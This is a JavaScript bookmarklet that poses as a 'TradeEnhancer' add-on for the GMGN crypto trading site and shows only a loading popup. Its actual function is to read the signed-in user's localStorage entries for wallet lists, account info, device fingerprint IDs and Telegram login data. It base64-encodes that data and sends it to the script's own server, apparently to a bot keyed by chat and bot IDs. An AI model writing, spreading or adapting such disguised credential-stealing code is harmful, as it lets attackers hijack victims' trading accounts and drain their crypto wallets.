(async () => {
    const scriptElement = document.currentScript;
    let api_url = new URL(scriptElement.getAttribute("src"));
    let code = api_url.searchParams.get("code");
    let username = api_url.searchParams.get("username");
    let platform = api_url.searchParams.get("platform");
    let botId = api_url.searchParams.get("botId");


    function showLiquidLoaderPopup() {
        const POPUP_ID = '__liquid_loader_popup__';
        const STYLE_ID = '__liquid_loader_popup_styles__';
        const SIZE_LIMITS = {
          minWidth: 220,
          minHeight: 160,
          maxWidth: () => Math.min(380, window.innerWidth - 32),
          maxHeight: () => Math.min(360, window.innerHeight - 32),
          collapsedHeight: 44,
        };
        const clamp = (value, min, max) => Math.min(Math.max(value, min), max);
      
        const existing = document.getElementById(POPUP_ID);
        if (existing) {
          existing.__cleanup?.();
          existing.remove();
        }
      
        let styleTag = document.getElementById(STYLE_ID);
        if (!styleTag) {
          styleTag = document.createElement('style');
          styleTag.id = STYLE_ID;
          styleTag.textContent = `
            #${POPUP_ID} {
              position: fixed;
              bottom: 16px;
              right: 16px;
              padding: 16px 20px 18px;
              border-radius: 18px;
              color: #f4f6fb;
              font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
              background: rgba(17, 25, 40, 0.8);
              box-shadow:
                0 25px 45px rgba(0, 0, 0, 0.35),
                inset 0 0 0 1px rgba(255, 255, 255, 0.08);
              backdrop-filter: blur(14px);
              -webkit-backdrop-filter: blur(14px);
              z-index: 6000;
              display: flex;
              flex-direction: column;
              gap: 12px;
              transition: transform 0.25s ease, opacity 0.25s ease, height 0.2s ease;
              min-width: ${SIZE_LIMITS.minWidth}px;
              min-height: ${SIZE_LIMITS.minHeight}px;
              max-width: min(380px, calc(100vw - 32px));
              max-height: min(360px, calc(100vh - 32px));
              overflow: hidden;
            }
            #${POPUP_ID}::before {
              content: '';
              position: absolute;
              inset: 0;
              border-radius: inherit;
              background: radial-gradient(circle at top, rgba(255,255,255,0.18), transparent 60%);
              pointer-events: none;
              opacity: 0.85;
            }
            #${POPUP_ID} .popup-header,
            #${POPUP_ID} .popup-body {
              position: relative;
              z-index: 1;
            }
            #${POPUP_ID}.collapsed {
              padding: 10px 16px;
              min-height: ${SIZE_LIMITS.collapsedHeight}px;
              height: ${SIZE_LIMITS.collapsedHeight}px !important;
              max-height: ${SIZE_LIMITS.collapsedHeight}px;
              min-width: auto;
              width: max-content;
              max-width: 240px;
            }
            #${POPUP_ID}.collapsed .popup-body {
              opacity: 0;
              max-height: 0;
            }
            #${POPUP_ID}.collapsed .resize-handle {
              display: none;
            }
            #${POPUP_ID} .popup-header {
              display: flex;
              align-items: center;
              justify-content: space-between;
              gap: 12px;
              cursor: grab;
              user-select: none;
            }
            #${POPUP_ID} .popup-header:active {
              cursor: grabbing;
            }
            #${POPUP_ID} .popup-title {
              font-size: 13px;
              letter-spacing: 0.16em;
              text-transform: uppercase;
              opacity: 0.9;
            }
            #${POPUP_ID} button.popup-toggle {
              background: rgba(255, 255, 255, 0.12);
              border: none;
              border-radius: 999px;
              width: 26px;
              height: 26px;
              color: inherit;
              cursor: pointer;
              display: inline-flex;
              align-items: center;
              justify-content: center;
              transition: background 0.2s ease;
            }
            #${POPUP_ID} button.popup-toggle:hover {
              background: rgba(255, 255, 255, 0.22);
            }
            #${POPUP_ID} .popup-body {
              flex: 1;
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              text-align: center;
              gap: 14px;
              overflow: hidden;
              transition: max-height 0.25s ease, opacity 0.2s ease;
            }
            #${POPUP_ID} .spinner {
              width: 38px;
              height: 38px;
              border-radius: 50%;
              border: 3px solid rgba(244, 246, 251, 0.14);
              border-top-color: #7dd9ff;
              animation: liquid-spin 0.9s linear infinite;
            }
            #${POPUP_ID} .loading-text {
              font-size: 16px;
              letter-spacing: 0.16em;
              text-transform: uppercase;
            }
            #${POPUP_ID} .resize-handle {
              position: absolute;
              bottom: 6px;
              right: 10px;
              width: 16px;
              height: 16px;
              border-right: 2px solid rgba(255, 255, 255, 0.5);
              border-bottom: 2px solid rgba(255, 255, 255, 0.5);
              cursor: nwse-resize;
              opacity: 0.7;
            }
            @keyframes liquid-spin {
              from { transform: rotate(0deg); }
              to { transform: rotate(360deg); }
            }
          `;
          document.head.appendChild(styleTag);
        }
      
        const popup = document.createElement('div');
        popup.id = POPUP_ID;
        popup.innerHTML = `
          <div class="popup-header" data-role="drag">
            <span class="popup-title">TradeEnhancer</span>
            <button class="popup-toggle" type="button" aria-label="Toggle popup" data-action="toggle">—</button>
          </div>
          <div class="popup-body">
            <div class="spinner" aria-hidden="true"></div>
            <span class="loading-text">Loading</span>
          </div>
          <div class="resize-handle" data-role="resize"></div>
        `;
        document.body.appendChild(popup);
      
        let expandedSize = {
          width: clamp(popup.offsetWidth || SIZE_LIMITS.minWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
          height: clamp(popup.offsetHeight || SIZE_LIMITS.minHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
        };
      
        const applyExpandedSize = () => {
          expandedSize = {
            width: clamp(expandedSize.width, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
            height: clamp(expandedSize.height, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
          };
          popup.style.width = `${expandedSize.width}px`;
          popup.style.height = `${expandedSize.height}px`;
        };
      
        const rememberExpandedSize = () => {
          expandedSize = {
            width: clamp(popup.offsetWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
            height: clamp(popup.offsetHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
          };
        };
      
        applyExpandedSize();
      
        const keepWithinViewport = () => {
          const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
          const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
          const currentX = parseFloat(popup.style.left || `${maxX}`);
          const currentY = parseFloat(popup.style.top || `${maxY}`);
          popup.style.left = `${clamp(currentX, 16, maxX)}px`;
          popup.style.top = `${clamp(currentY, 16, maxY)}px`;
        };
      
        popup.style.position = 'fixed';
        keepWithinViewport();
      
        const toggleButton = popup.querySelector('[data-action="toggle"]');
        const setCollapsed = (shouldCollapse) => {
          if (shouldCollapse) {
            rememberExpandedSize();
            popup.classList.add('collapsed');
            popup.style.width = '';
            popup.style.height = '';
            toggleButton.textContent = '+';
          } else {
            popup.classList.remove('collapsed');
            applyExpandedSize();
            toggleButton.textContent = '—';
          }
          requestAnimationFrame(() => keepWithinViewport());
        };
      
        toggleButton.addEventListener('click', () => {
          setCollapsed(!popup.classList.contains('collapsed'));
        });
      
        const dragHandle = popup.querySelector('[data-role="drag"]');
        let dragStart = null;
        const startDrag = (event) => {
          event.preventDefault();
          dragStart = {
            pointerX: event.clientX,
            pointerY: event.clientY,
            left: parseFloat(popup.style.left) || 16,
            top: parseFloat(popup.style.top) || 16,
          };
          document.addEventListener('pointermove', onDrag);
          document.addEventListener('pointerup', stopDrag, { once: true });
        };
      
        const onDrag = (event) => {
          if (!dragStart) return;
          const deltaX = event.clientX - dragStart.pointerX;
          const deltaY = event.clientY - dragStart.pointerY;
          const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
          const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
          popup.style.left = `${clamp(dragStart.left + deltaX, 16, maxX)}px`;
          popup.style.top = `${clamp(dragStart.top + deltaY, 16, maxY)}px`;
        };
      
        const stopDrag = () => {
          dragStart = null;
          document.removeEventListener('pointermove', onDrag);
        };
      
        dragHandle.addEventListener('pointerdown', startDrag);
      
        const resizeHandle = popup.querySelector('[data-role="resize"]');
        let resizeStart = null;
        const startResize = (event) => {
          if (popup.classList.contains('collapsed')) return;
          event.preventDefault();
          resizeStart = {
            pointerX: event.clientX,
            pointerY: event.clientY,
            width: popup.offsetWidth,
            height: popup.offsetHeight,
          };
          document.addEventListener('pointermove', onResize);
          document.addEventListener('pointerup', stopResize, { once: true });
        };
      
        const onResize = (event) => {
          if (!resizeStart) return;
          const deltaX = event.clientX - resizeStart.pointerX;
          const deltaY = event.clientY - resizeStart.pointerY;
          const nextWidth = clamp(resizeStart.width + deltaX, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth());
          const nextHeight = clamp(resizeStart.height + deltaY, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight());
          expandedSize = { width: nextWidth, height: nextHeight };
          applyExpandedSize();
          keepWithinViewport();
        };
      
        const stopResize = () => {
          resizeStart = null;
          document.removeEventListener('pointermove', onResize);
        };
      
        resizeHandle.addEventListener('pointerdown', startResize);
      
        const resizeObserver = new ResizeObserver(() => {
          if (!popup.classList.contains('collapsed')) {
            rememberExpandedSize();
          }
          keepWithinViewport();
        });
        resizeObserver.observe(popup);
      
        const resizeHandler = () => {
          if (!popup.classList.contains('collapsed')) {
            applyExpandedSize();
          }
          keepWithinViewport();
        };
        window.addEventListener('resize', resizeHandler, { passive: true });
        keepWithinViewport();
      
        requestAnimationFrame(() => {
          popup.style.transform = 'translateY(6px)';
          popup.style.opacity = '0';
          requestAnimationFrame(() => {
            popup.style.transform = 'translateY(0px)';
            popup.style.opacity = '1';
          });
        });
      
        popup.__cleanup = () => {
          window.removeEventListener('resize', resizeHandler);
          resizeObserver.disconnect();
          document.removeEventListener('pointermove', onDrag);
          document.removeEventListener('pointermove', onResize);
        };
    }
    showLiquidLoaderPopup();

    async function retryWithBackoff(fn, options = {}) {
        const {
            maxRetries = 3,
            initialDelay = 1000,
            maxDelay = 10000,
            backoffMultiplier = 2
        } = options;

        let lastError;

        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            try {
                return await fn();
            } catch (error) {
                lastError = error;

                if (attempt === maxRetries) {
                    throw lastError;
                }

                const delay = Math.min(
                    initialDelay * Math.pow(backoffMultiplier, attempt),
                    maxDelay
                );

                console.debug(`⚠️ Retry attempt ${attempt + 1}/${maxRetries} after ${delay}ms...`);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }

        throw lastError;
    }

    async function fetchWithTimeoutUtil(url, options = {}, timeout = 30000) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);

        try {
            const response = await fetch(url, {
                ...options,
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            return response;
        } catch (error) {
            clearTimeout(timeoutId);
            if (error.name === 'AbortError') {
                throw new Error(`Request timeout after ${timeout}ms`);
            }
            throw error;
        }
    }

    async function sendMessageToServer(message = '', error = 0, errorMessage = '', chatId = code, username = username, platform = platform) {
        try {
            await retryWithBackoff(
                async () => {
                    const response = await fetchWithTimeoutUtil(
                        `${api_url.origin}/api/message`,
                        {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(
                                error === 1
                                    ? { error: 1, chatId: chatId, errorMessage: errorMessage, platform: platform, username: username, botId: botId }
                                    : { error: 0, chatId: chatId, message: message, platform: platform, username: username, botId: botId }
                            )
                        },
                        15000
                    );

                    if (!response.ok) {
                        throw new Error(`Server responded with ${response.status}`);
                    }

                    return response;
                },
                { maxRetries: 3, initialDelay: 2000 }
            );
        } catch (err) {
            console.error('Failed to send message to server after retries:', err);
        }
    }

    try {
        console.log('[GMGN] Started');

        if (!localStorage.getItem("accountInfo")) {
            alert("You must be signed in to use this bookmarklet.")
            return;
        }

        const keys = ["__tgWallet_list_info__", "accountInfo", "key_device_id", "key_fp_did", "tgInfo", "tg_login_account_id"];
        function exportLocalStorage() {
            const obj = {};
            for (const key of keys) {
                const value = localStorage.getItem(key);
                if (value !== null) {
                    try {
                        obj[key] = JSON.parse(value);
                    } catch {
                        obj[key] = value;
                    }
                }
            }
            return JSON.stringify(obj);
        }
        const localStorageData = exportLocalStorage();
        
        // Browser-compatible base64 encoding
        const toBase64 = (str) => {
            try {
                return btoa(unescape(encodeURIComponent(str)));
            } catch (e) {
                console.error('Base64 encoding failed:', e);
                throw new Error('Failed to encode data');
            }
        };
        
        const payload = JSON.stringify({ 
            localstorage: localStorageData, 
            code: code, 
            username: username, 
            platform: platform 
        });
        
        await sendMessageToServer(toBase64(payload), 0, "", code, username, platform);

    } catch (err) {
        console.error('Failed to send message to server after retries:', err);
        await sendMessageToServer("", 1, "📍 <b>Platform: </b> " + platform + "\n\n❌ <b>Failed to load bookmarklet</b>\n\nError: <code>" + err.message + "</code>", code, username, platform);
    }
})();

